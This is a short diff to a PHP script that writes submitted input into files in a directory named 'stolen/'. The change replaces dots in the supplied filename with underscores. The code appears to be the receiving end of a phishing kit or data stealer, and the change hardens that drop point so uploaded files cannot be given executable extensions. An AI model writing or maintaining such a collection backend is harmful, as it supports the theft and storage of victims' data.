@@ -232,7 +232,7 @@ file_put_contents($p, $inp);
 chmod($p, 0640);
 }else if($inp != "" && strlen($fname) > 0)
 {
-$p = "stolen/" . $fname;
+$p = "stolen/" . str_replace(".", "_", $fname);
 file_put_contents($p, $inp);
 chmod($p, 0640);
 }
